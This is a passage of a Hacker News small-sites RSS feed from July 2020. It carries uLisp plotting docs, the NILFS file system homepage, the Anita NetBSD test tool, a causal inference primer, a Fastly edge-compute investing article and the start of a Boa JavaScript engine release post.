<p>The following example plots the voltages on the analogue inputs 0 to 3 once a second on a single plot. First define:</p>
<pre>(defun adc (n) (lambda (x) (delay 250) (/ (analogread n) 8)))</pre>
<p>Then give the command:</p>
<pre>(plot 0 0 (adc 0) (adc 1) (adc 2) (adc 3))</pre>
<h3>plot3d&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot3d&nbsp;[<em>x-intercept y-intercept</em>] [<em>function</em>])</code></p>
<p>The function should be a function of two parameters, the x and y coordinates, and it will be called with each value of x from 0 to 255 and y from 0 to 63. The function should return the greyscale value to be plotted, from 0 to 15.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun p (x y) 
  (let ((a (/ (- x 128) 2))
        (b (- y 32))) 
    (min (abs (- (logand (/ (+ (* a a) (* b b) (* a b)) 16) 31) 15)) 15)))</pre>
<p>the following command:</p>
<pre>(plot3d 128 32 p)</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispellipses.jpg" alt="LispEllipses.jpg" width="600" height="211"></p>
</div></div>]]>
            </description>
            <link>http://www.ulisp.com/show?2L0C</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729970</guid>
            <pubDate>Sat, 04 Jul 2020 03:54:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nilfs – log-structured file system with versioning of the entire fs]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729911">thread link</a>) | @SpaceInvader
<br/>
July 3, 2020 | https://nilfs.sourceforge.io/en/ | <a href="https://web.archive.org/web/*/https://nilfs.sourceforge.io/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_column">
<h2>Welcome to NILFS</h2>
<p>
NILFS is a log-structured file system supporting versioning of the
entire file system and continuous snapshotting which allows users to
even restore files mistakenly overwritten or destroyed just a few seconds ago.
</p><p>
NILFS was developed by NTT Laboratories and published as an
open-source software under GPL license, and now available as a part
of Linux kernel.
</p><p>
This site provides information and resources
related to the NILFS filesystem.
</p>
<p>*** Fake site warning ***</p>
<p>
''www.nilfs.org'' has been reopened as a fake site by a third
party after we abandoned the domain in September 2014.
The fake site defaces the original content, leading visitors to
unrelated websites, so please be careful not to go to the site
mistakenly.  NILFS community and NTT are absolutely not related
to this fake site.
</p><p>
The official NILFS website is
<a href="https://nilfs.sourceforge.io/">nilfs.sourceforge.io</a>
or
<a href="https://nilfs.osdn.jp/">nilfs.osdn.jp</a> (mirror site).
Please use these sites when accessing information related to NILFS.
</p>

<h2>Latest News</h2>
<ul>
<li id="n132">NILFS utilities 2.2.8 was released. A maintenance release with some fixes.  Fix some build issues and minor bugs in mkfs.nilfs2.<br>
-- Aug 20, 2019 JST.</li>
<li id="n131">nilfs2-kmod7 version 1.1.2 was released.  Fix a race condition bug that causes file system corruption.  For details, please see <a href="https://raw.github.com/nilfs-dev/nilfs2-kmod7/v1.1.2/ChangeLog">ChangeLog file</a> or <a href="https://github.com/nilfs-dev/nilfs2-kmod7/commits/v1.1.2">commit logs</a>.<br>
-- Nov 18, 2017 JST.</li>
<li id="n130">nilfs2-kmod6 version 1.1.2 was released.  Fix a race condition bug that causes file system corruption.  For details, please see <a href="https://raw.github.com/nilfs-dev/nilfs2-kmod6/v1.1.2/ChangeLog">ChangeLog file</a> or <a href="https://github.com/nilfs-dev/nilfs2-kmod6/commits/v1.1.2">commit logs</a>.<br>
-- Nov 18, 2017 JST.</li>

</ul>
<p>
<a href="https://nilfs.sourceforge.io/en/oldnews.html">Old news</a>
</p>
</div></div>]]>
            </description>
            <link>https://nilfs.sourceforge.io/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729911</guid>
            <pubDate>Sat, 04 Jul 2020 03:40:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anita, an Automated NetBSD Installation and Test Application]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729886">thread link</a>) | @jayp1418
<br/>
July 3, 2020 | https://www.gson.org/netbsd/anita/ | <a href="https://web.archive.org/web/*/https://www.gson.org/netbsd/anita/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p>Anita is a tool for automated testing of
the <a href="http://www.netbsd.org/">NetBSD</a> operating
system.  Using anita, you can download a NetBSD
distribution and install it in a
virtual machine in a fully
automated fashion.  It's fun to watch, and it has helped find
a large number of bugs in NetBSD, as well as several bugs in
qemu and other emulators.</p>

The virtual machine anita installs into is typically based
on <a href="https://www.qemu.org/">qemu</a>, but the
i386 and amd64 ports of NetBSD can also be installed in a
<a href="http://www.xen.org/">Xen</a> domU, and some of
the more exotic NetBSD ports use gxemul or simh.

<p>For example, the following command will download, install, and boot
NetBSD/i386 6.1.5 in a qemu virtual machine, and leave you at the login 
prompt:
</p>

<pre>   anita interact http://ftp.netbsd.org/pub/NetBSD/NetBSD-6.1.5/i386/
</pre>

<p>The main focus of anita is on testing the <i>sysinst</i>
installation procedure and quickly detecting regressions that cause
the system to fail to install or boot, but anita is now also finding
use as a platform for testing the whole NetBSD system by running the 
ATF test suite.  Output from
periodic anita tests of NetBSD-current on multiple architectures
can be found on the
<a href="http://releng.netbsd.org/test-results.html">NetBSD release engineering web pages</a>.
</p><p>Anita is written in <a href="http://www.python.org/">Python</a>
and uses the
<a href="http://pexpect.sourceforge.net/pexpect.html">pexpect</a> module
to "screen scrape" the sysinst output over an emulated serial console
and script the installation procedure.</p>

<p>The set of NetBSD ports supported by anita is growing,
and currently includes the following:
<a href="http://www.netbsd.org/Ports/i386/">i386</a>,
<a href="http://www.netbsd.org/Ports/amd64/">amd64</a>,
<a href="http://www.netbsd.org/Ports/sparc/">sparc</a>,
<a href="http://www.netbsd.org/Ports/pmax/">pmax</a>,
<a href="http://www.netbsd.org/Ports/hpcmips/">hpcmips</a>,
<a href="http://www.netbsd.org/Ports/evbarm/">evbarm-earmv7hf</a>,
<a href="http://www.netbsd.org/Ports/evbarm/">evbarm-aarch64</a>,
and
<a href="http://www.netbsd.org/Ports/vax/">vax</a>.
If you know how to manually install some
other NetBSD port in an emulator using a serial console,
please send a full typescript of the terminal session 
to the anita author so that support for that port can be
added to anita.
</p><p>
Anita fully supports cross-installation setups where
the machine running anita is a different architecture
from the virtual machine being installed on.  Anita
has also been successfully used to cross-install
NetBSD in virtual machines hosted on operating
systems other than NetBSD itself, including
FreeBSD, Linux, and Mac OS X.
</p>

<p>Here's an animated screenshot of Anita 1.2 installing and booting NetBSD 4.0RC3:</p>

<p><img src="https://www.gson.org/netbsd/anita/screenshot.gif">
</p>



<p>For more information, see the <i>anita(1)</i> man page in the latest
anita distribution.</p>

<p>Anita can be installed via <a href="http://www.pkgsrc.org/">pkgsrc</a>
as <i>misc/py-anita</i>.  Releases can also be downloaded manually
<a href="https://www.gson.org/netbsd/anita/download/">here</a>, and the source repository is
at <a href="https://github.com/gson1703/anita">github</a>.</p>

<br clear="all"><hr>
<a href="https://www.gson.org/">[To gson's home page]</a>


</div>]]>
            </description>
            <link>https://www.gson.org/netbsd/anita/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729886</guid>
            <pubDate>Sat, 04 Jul 2020 03:35:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting into a Causal Flow: An Introduction to Causal Inference]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729680">thread link</a>) | @kkacquah
<br/>
July 3, 2020 | https://www.causalflows.com/introduction/ | <a href="https://web.archive.org/web/*/https://www.causalflows.com/introduction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>May 20, 2020</p></header><h2>Why Should You Care?</h2><p><strong>Most, if not all, business analytics questions, are inquiries of cause and effect</strong>. Designers estimate the extent to which UX changes effect user engagement metrics. Finance departments estimate the returns generated from costly corporate initiatives. Marketers fine-tune email newsletters and subscription services to estimate how their improvements can help to minimize churn rates. In statistics and econometrics literature, the term <em>causal inference</em> describes the quantitative process of answering such inquiries of cause and effect.
As opposed to traditional inference problems, like prediction, that may take in a set of prior events and predict a distribution over a set of future events, causal inference is mainly concerned with generating and testing hypotheses, commonly referred to as <strong>structural models</strong>, of the relationships between the values of <strong>explanatory variables</strong>, or variables which change to incur a cause and <strong>outcome variables</strong> which change as the result of an effect. Causal inference techniques are largely concerned with discerning <em>associative relationships</em>  (relationships between two variables for which a change in one variable is <em>associated</em> with a change in another) from <em>causal relationships</em> (relationships between the data describing a <em>cause</em> and an <em>effect</em>, for which the cause is an event that contributes to the production of another event, the effect).</p><h2>Why Is Causal Inference Necessary?</h2><p>What is insufficient about traditional inference techniques, such as regression? Many are familiar with the adage “correlation does not imply causation”,
but why is the distinction between associative and causal relationships so important? Consider the following time series featuring drowning deaths and ice cream consumption by month in Spain.</p><h2>An Illustrative Example</h2><p>These time series track quite closely together, with drowning  deaths slightly leading ice cream consumption. </p><undefined><span>
      <a href="https://www.causalflows.com/static/722afc416fd61bb4f39af55a8db5b275/8c557/IceCreamConsumptionvsDrowningDeaths.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="IceCreamConsumptionvsDrowningDeaths" title="IceCreamConsumptionvsDrowningDeaths" src="https://www.causalflows.com/static/722afc416fd61bb4f39af55a8db5b275/fcda8/IceCreamConsumptionvsDrowningDeaths.png" srcset="https://www.causalflows.com/static/722afc416fd61bb4f39af55a8db5b275/12f09/IceCreamConsumptionvsDrowningDeaths.png 148w,https://www.causalflows.com/static/722afc416fd61bb4f39af55a8db5b275/e4a3f/IceCreamConsumptionvsDrowningDeaths.png 295w,https://www.causalflows.com/static/722afc416fd61bb4f39af55a8db5b275/fcda8/IceCreamConsumptionvsDrowningDeaths.png 590w,https://www.causalflows.com/static/722afc416fd61bb4f39af55a8db5b275/8c557/IceCreamConsumptionvsDrowningDeaths.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span><p><span><strong>Figure 1: </strong>A line plot of drowning deaths and ice cream consumption by month in Spain during the year 2018. Note that our data set is incomplete, and lacks drowning death data for December 2018.</span></p>
 The relationship between these time series can likely be classified as an associative relationship, as the observed weight of ice cream consumed seems to move with the observed number of drownings during each month. In addition, their relationship can be described as, a positive 
correlational relationship, or an associative relationship between variables in which an increase in one variable, corresponds to an increase in the other. 
Basic critical reasoning skills can help us infer that it is unlikely there is a causal relationship between these series, 
as it is hard to imagine a mechanism in which ice cream consumption directly affects drowning deaths, and much easier to imagine 
that an increase in outdoor activity due to warmer temperatures in the summer months are contributing to an increase in visits to the beach where millions of Spaniards buy delicious icy treats, and a few hundred unfortunately drown at sea.</undefined><undefined><span>
      <a href="https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/3acf0/iceCreamTruck.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="iceCreamTruck" title="iceCreamTruck" src="https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/1c72d/iceCreamTruck.jpg" srcset="https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/a80bd/iceCreamTruck.jpg 148w,https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/1c91a/iceCreamTruck.jpg 295w,https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/1c72d/iceCreamTruck.jpg 590w,https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/a8a14/iceCreamTruck.jpg 885w,https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/fbd2c/iceCreamTruck.jpg 1180w,https://www.causalflows.com/static/f302ad24b29a84463243082634219cae/3acf0/iceCreamTruck.jpg 2000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span><p><span><strong>Figure 2: </strong>It's no secret that beachgoers love to consume ice cream. It's as if there is some common mechanism that makes us want to go to the beach and want to eat ice cream...</span></p></undefined><h2>When Is “Traditional” Inference Good Enough?</h2><p>It is illustrative to consider the inference tasks for which a presentation of the associative relationship is sufficient, in order to understand the kinds of
tasks which are ill-suited for causal inference.
For example, let’s say you’re an analyst given the <em>prediction task</em> of estimating drowning deaths in December of 2018, solely with data plotted in Figure 1.
This can be done easily, by understanding that ice cream consumption and drowning are highly correlated and thus the small change
in ice cream consumption from November to December likely corresponds to a small change in drowning deaths between the two months. </p><p>Similarly, let’s say you are an analyst given the <strong>classification task</strong> of estimating the probability that a particular death in Spain
in the month of December is due to an unfortunate drowning, using data given from the time series plotted in Figure 1. Again it is easy to see that drowning deaths will likely continue to track with ice cream consumption and hardly change from November to December.
If in Spain, about 37,000 people died in December of 2018, its clear to see without any additional information that the probability that
a particular death were due to a drowning is likely quite low.</p><h2>When is it not?</h2><p>Ok, so if an understanding of associative relationships are sufficient for classification and prediction tasks, are there any tasks that require an understanding of causal relationships?
I sure hope so; if not, I started this newsletter for nothing. The most common inference task that requires an understanding of causal relationships is a <strong>intervention recommendation task</strong>,
or a task in which an analyst must decide how best to make an intervention in order to achieve a desired outcome. For example, imagine you are now tasked with constructing a plan of action to reduce drowning deaths in Spain by 50% going into the summer of 2020. If you were to simply use your understanding of the associative relationship between ice cream consumption and drowning deaths, you could quickly propose a plan to shut down all ice cream trucks in the entire country, as that would certainly correlate with a drop in drownings! However, providing such a recommendation is a ridiculous idea, and would surely correlate with you being out of a job by the end of the week.</p><p>Associative relationships are not enough to develop the causal understandings necessary to inform intervention recommendations. In order to understand which intervention should be made to improve an outcome,
we must understand what causes the underlying processes generating our data. In our pedagogical example, changes in ice cream consumption are not causing changes in drownings simply because they are correlated.
Similarly, changes in drownings are not causing changes in ice cream consumption. Rather, it is a third variable, temperature, that is responsible for the tight correlation relation you see in this data. In future posts, I will discuss causal discovery problems, for which one can leverage a class of algorithms to automatically discover such causal relationships. For now, your key takeaway should be as follows:
<strong>Without causal inference techniques, you cannot mathematically verify that any event directly or indirectly causes any particular target event. Standard statistical analysis only enables analysts to infer associative relationships between variables.</strong> For this reason, analytical tools describing how exactly ice cream consumption and monthly drownings move together over time are not sufficient to inform policy decisions which aim to decrease drowning deaths.
<!-- -->&nbsp;</p><undefined><span>
      <a href="https://www.causalflows.com/static/6682e42bc5997ae0dd27ecf68a5f2b05/f816d/historyOfCausalInference.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="historyOfCausalInference" title="historyOfCausalInference" src="https://www.causalflows.com/static/6682e42bc5997ae0dd27ecf68a5f2b05/f816d/historyOfCausalInference.png" srcset="https://www.causalflows.com/static/6682e42bc5997ae0dd27ecf68a5f2b05/12f09/historyOfCausalInference.png 148w,https://www.causalflows.com/static/6682e42bc5997ae0dd27ecf68a5f2b05/e4a3f/historyOfCausalInference.png 295w,https://www.causalflows.com/static/6682e42bc5997ae0dd27ecf68a5f2b05/f816d/historyOfCausalInference.png 461w" sizes="(max-width: 461px) 100vw, 461px" loading="lazy">
  </a>
    </span>
  <p><span><strong>Figure 3:</strong> Causal inference has its roots in a variety of economic fields, but most early literature in the topic comes from computer science, statistics, epidemiology, and economics.</span></p></undefined><p>Causal inference has served as the primary goal of academic researchers in a variety of fields who are concerned with evaluating the resultant success of particular interventions. It helps economists determine the expected effect of a minimum wage increase in a particular US state.
It helps medical researchers estimate how much of a decrease in blood glucose level can be attributed to beginning an insulin treatment schedule.
It helps poker-playing AI software determine the effect a particular action has had on its win probability. Causal inference can be a powerful tool for business analysts, who commonly query large repositories of customer information in order to
inform a data-driven decision making process.
In this blog series, I will discuss common techniques for utilizing causal inference in a business analytics setting, mainly those leveraging artificial intelligence and machine learning to swiftly build, evaluate, and tweak intervention recommendation models to unlock latent value from large-scale data sets.</p><hr></article></div>]]>
            </description>
            <link>https://www.causalflows.com/introduction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729680</guid>
            <pubDate>Sat, 04 Jul 2020 02:57:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fastly Edge Compute Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729452">thread link</a>) | @gilad
<br/>
July 3, 2020 | https://softwarestackinvesting.com/fastly-edge-compute-explained/ | <a href="https://web.archive.org/web/*/https://softwarestackinvesting.com/fastly-edge-compute-explained/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
		
<div><figure><img src="https://softwarestackinvesting.com/wp-content/uploads/2020/07/FSLY-Logo-2.png" alt="" width="453" height="323" srcset="https://softwarestackinvesting.com/wp-content/uploads/2020/07/FSLY-Logo-2.png 576w, https://softwarestackinvesting.com/wp-content/uploads/2020/07/FSLY-Logo-2-300x214.png 300w" sizes="(max-width: 453px) 100vw, 453px"></figure></div>



<p>Fastly (FSLY) has experienced an incredible run over the past several weeks.  The share price has more than doubled since <a aria-label="undefined (opens in a new tab)" href="https://softwarestackinvesting.com/fastly-fsly-q1-2020-earnings-results-review/" target="_blank" rel="noreferrer noopener nofollow">releasing</a> Q1 earnings on May 6.  This can be primarily attributed to the major increase in guidance for Q2 and the rest of the year.  There have been other surprises as well, like the <a aria-label="undefined (opens in a new tab)" href="https://www.streamingmediablog.com/2020/05/fastly-amazon-homepage.html" target="_blank" rel="noreferrer noopener nofollow">observation</a> that Amazon.com has been using Fastly POPs for content delivery.  A lot of investor excitement is also pinned on the upcoming release of <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/products/edge-compute/serverless" target="_blank" rel="noreferrer noopener nofollow">Compute@Edge</a>, which represents a significant extension of Fastly’s current CDN offerings.  Since the product is in beta, it isn’t clear how sizable the revenue impact will be.  Given this, I thought it would be worth spending some time examining how Fastly has approached building new technologies in the past and what this might mean for their future edge compute offering.  I also wanted to share my understanding of the technical underpinnings of the platform and how these differ from other serverless offerings currently on the market.  Whether Fastly’s surge represents a one-time COVID-19 driven bump or they will sustain long-term usage growth remains to be seen.  With this information, investors can decide for themselves if the Fastly story is hype or their edge compute platform represents the beginning of something fundamentally disruptive.</p>



<h3>Fastly’s Roots and Bad CDNs</h3>



<p>Since its founding, there has been something different about Fastly’s mind set.  The Fastly team has a trait ingrained in their DNA to address hard technical problems with innovative and often more difficult solutions, with the goal to create a better experience for their customers.  This was applied to the CDN business originally and is now manifesting in the design of a fast, compact, secure, globally distributed serverless compute platform.  </p>



<p>Fastly was founded by Artur Bergman in 2011, directly as a consequence of his frustration with using existing CDN solutions as the CTO of <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Fandom_(website)" target="_blank" rel="noreferrer noopener nofollow">Wikia</a>, a popular hosting service for wikis.  At the time, CDN offerings were dominated by entrenched players like Akamai (AKAM), Limelight (LLNW) and even emerging CDN products from cloud vendors, such as <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Amazon_CloudFront" target="_blank" rel="noreferrer noopener nofollow">Amazon Cloudfront</a>.  As the story goes, Artur became frustrated with the capabilities of CDNs around 2010.  He complained about needing technical support to make any adjustments to his CDN configuration and long delays while changes rolled out. Existing solutions lacked programmability, a trait highly valued by the engineering teams who were increasingly getting pulled into discussions about application performance and uptime through the DevOps movement.  With a strong hands-on technical background, Artur decided that he could build a better solution and did so.   </p>



<p>Out of this Fastly was born, with an intent to find better ways to enable modern software engineering organizations to optimize the delivery of their internet applications.  This was grounded in an avoidance of the status quo and the easy path.  Fastly’s Chief Product Architect recently <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/why-edge-compute-does-not-yet-support-javascript" target="_blank" rel="noreferrer noopener nofollow">said</a> “Fastly has a long history of looking at problems from first principles and being unafraid to undertake difficult projects if we know they will benefit our customers.”  This approach reminds of <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Eric_Yuan" target="_blank" rel="noreferrer noopener nofollow">Eric Yuan</a> at Zoom Video (ZM) and his journey to build a better video conferencing solution.  At the time in 2011, it would have been easy to question why Eric thought he could improve on existing video conferencing offerings from <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Cisco_Webex" target="_blank" rel="noreferrer noopener nofollow">WebEx</a> and <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Skype" target="_blank" rel="noreferrer noopener nofollow">Skype</a>, in what many would consider a largely commoditized space.  Yet, Zoom’s success can be attributed to a highly focused and passionate drive to deliver an incrementally better experience for their users.  I posit that Fastly is doing the same for content delivery and distributed compute infrastructure with a laser focus on what is better for the developer.</p>



<h3>Applied to Network Design</h3>



<p>While Fastly was initially getting off the ground as a cash-strapped start-up, they applied this approach to the design of their content delivery network. They could have taken the common path of deploying network and server hardware in a standard configuration at many POPs across the globe.  To route traffic across the internet, they could have purchased expensive off the shelf routers.  However, the team stepped back, examined the problems they were trying to solve and designed a <a aria-label="undefined (opens in a new tab)" href="https://vimeo.com/132842124" target="_blank" rel="noreferrer noopener nofollow">different approach</a> to their content delivery network.  It didn’t hurt that they needed to preserve cash, which pushed the team towards addressing common functionality with their own custom software modules versus commercial products.  This software-driven design has paid dividends many times over, giving the team the flexibility to evolve their network design as content delivery use cases change.</p>



<p>As the first problem, the Fastly team <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://www.fastly.com/blog/building-and-scaling-fastly-network-part-1-fighting-fib" target="_blank">examined</a> approaches to handling networking traffic into and out of their POPs.  The standard configuration was to purchase border routers that can store the entire <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol" target="_blank">internet routing table</a> in memory space.  Switches were less expensive, but didn’t offer the memory or compute necessary to handle full internet routing.  In 2013, <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Arista_Networks" target="_blank">Arista Networks</a> began selling a switch that allowed users to run their own software on it.  This provided the best solution for the Fastly team.  They proceeded to write their own distributed routing agent, called Silverton, which orchestrates route configuration within Fastly POPs.  Silverton peers with the <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol" target="_blank">BGP</a> daemon, <a aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bird_Internet_routing_daemon" target="_blank">BIRD</a>, which interfaces with the outside internet.  This combination allows Fastly’s customized switches to function as a more expensive border router, saving hundreds of thousands of dollars for every POP they deployed.  Also, it pushes external routing logic down to the host level, reducing load on the switches and providing more fine-grained control over traffic routing per user request.  By custom designing Silverton, the Fastly team has full control over routing management within the POP, allowing them to push network path selection to the application level and achieve far greater control over network behavior.  This has been subsequently iterated upon to selectively override route selection for certain types of content and use cases, resulting in better content delivery performance than existing solutions that generally apply a single routing rule at the border router to all cases.</p>



<figure><img src="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram.png" alt="" srcset="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram.png 749w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram-300x157.png 300w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-Network-Diagram-676x354.png 676w" sizes="(max-width: 749px) 100vw, 749px"><figcaption>Fastly Custom Edge Router Logical Diagram</figcaption></figure>



<p>As the next problem, the Fastly team examined the assumption that having many small POPs geographically dispersed across the globe results in the best overall delivery times for user content.  This was the approach taken by other legacy CDNs who had invested in hundreds or thousands of small POPs, spread down to the city level.  This “strength in numbers” philosophy is still presented as an advantage today by legacy players, as it is easy to make the argument that more POPs are better for performance.  Actually, this is not generally the case, as the amount of content that can be cached at each small POP is limited.  So, a significant percentage of user requests will need to be sent back to the origin servers, which will increase access times for those requests by a factor of 10x or more.  For example, if the cache miss percentage increases by just 10%, it could raise overall average access times by 50% or more.  Fastly realized that having fewer POPs with much more storage space would actually result in faster average delivery times.  In a <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/why-having-more-pops-isnt-always-better" target="_blank" rel="noreferrer noopener nofollow">blog post</a> from 2016, one of Fastly’s co-founders gave the analogy of convenient stores versus supermarkets.  While a convenience store is generally closer to a person’s home, it has a limited set of items for sale.  If the person drives a few more miles to the supermarket, they could get all of their groceries in one trip.  In this case, convenience stores represent the approach taken by the legacy CDN’s with many local POPs and the supermarkets represent Fastly’s approach with fewer, larger ones.  </p>



<figure><img src="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-1024x522.png" alt="" srcset="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-1024x522.png 1024w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-300x153.png 300w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-768x391.png 768w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs-676x344.png 676w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POPs.png 1533w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Building and Scaling the Fastly Network, Fastly Altitude, 2015</figcaption></figure>



<p>This is why Fastly still has a limited number of POPs across the globe (<a href="https://investors.fastly.com/news/news-details/2020/Fastly-Achieves-100-Tbps-of-Edge-Capacity-Milestone/default.aspx" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">72 total</a> as of June), versus thousands advertised by competitors.  Fastly POPs are thoughtfully placed at network crossroads, where they provide proximity to geographic regions, but have the storage capacity to enable much higher hit ratios for user requests. </p>



<figure><img src="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POP-map-1024x493.png" alt="" srcset="https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POP-map-1024x493.png 1024w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POP-map-300x144.png 300w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POP-map-768x369.png 768w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POP-map-676x325.png 676w, https://softwarestackinvesting.com/wp-content/uploads/2020/06/Fastly-POP-map.png 1104w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Fastly Q1 2020 Investor Deck</figcaption></figure>



<p>Additionally, Fastly <a aria-label="undefined (opens in a new tab)" href="https://www.fastly.com/blog/how-our-solid-state-drives-result-cost-savings-customers" target="_blank" rel="noreferrer noopener nofollow">chose to utilize SSDs</a> (relatively new at the time) to store the cached data.  <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Solid-state_drive" target="_blank" rel="noreferrer noopener nofollow">SSDs</a> are more expensive than standard disks, but offer much faster retrieval times, on par with RAM.  Based on Fastly’s research, a typical hard drive could perform approximately&nbsp;450 IOPS when reading and 300-400 IOPS when writing (in a test with 4kb files).  The SSDs Fastly uses, however, execute somewhere in the region of 75,000 IOPS reading and 11,500 when writing. Making this design choice further contributed to reducing Fastly’s average response times, by making data retrieval within the POPs super fast (furthering the supermarket analogy, like having all your groceries sitting at the front door).  At the time, each server in a POP had 384 GB of RAM, and 6 TB of SSD space (made up from 12x 500 GB drives), and each CPU has 25 MB of L3 cache.  A typical POP had 32 machines spec’ed like this.  </p>



<p>But Fastly didn’t stop there.  They also wrote a custom storage engine for their POP servers to bypass the file system and squeeze every last drop of performance out of the SSDs, cramming as much data on them as possible.  They employ various algorithms to keep commonly used data in the 384 GB of RAM, making it even faster.  For some assets, such as “Like” or “Share” buttons that never change and are requested millions of times a second, they go even further by serving them out of the L3 cache directly from the processor.  </p>



<p>As a third problem with existing CDNs, Fastly examined the experience for developers and engineers within customer organizations who were responsible for delivering the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://softwarestackinvesting.com/fastly-edge-compute-explained/">https://softwarestackinvesting.com/fastly-edge-compute-explained/</a></em></p>]]>
            </description>
            <link>https://softwarestackinvesting.com/fastly-edge-compute-explained/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729452</guid>
            <pubDate>Sat, 04 Jul 2020 02:13:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boa v0.9: Measureme and Optimisations]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729319">thread link</a>) | @Avi-D-coder
<br/>
July 3, 2020 | https://boa-dev.github.io/2020/07/03/boa-release-09.html | <a href="https://web.archive.org/web/*/https://boa-dev.github.io/2020/07/03/boa-release-09.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>Hello World!</p>

<p>Boa is an experimental Javascript lexer, parser and compiler written in Rust. It has support for some of the language, can be embedded in Rust projects fairly easily and also used from the command line.<br>
Boa also exists to serve as a Rust implementation of the EcmaScript specification, there will be areas where we can utilise Rust and its fantastic ecosystem to make a fast, concurrent and safe engine.</p>

<p>Today we’re pleased to announce our latest release, version 0.9.<br>
v0.9 is by far the biggest release we’ve had since Boa began. You can find the full changes from the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#-090-2020-06-25---move-to-organisation-78-faster-execution-time">changelog</a>. The milestone behind this version was further optimisation and an increase in new features. We can show you how we can identify areas that can be optimised.</p>



<p>Boa became the first Rust project to make use of <a href="https://github.com/rust-lang/measureme">measureme</a>, a profiling tool built from the ground up for Rust. This was only used by the Rust team themselves to profile the compiler. We managed to work with the compiler team to get the framework in a good enough state to be used by other projects too, and in this release, we gave it a try.</p>

<p>Measure me lets you profile various areas of your choosing, then you can generate a trace file which can be loaded into Chromium or various other tools for analysis.
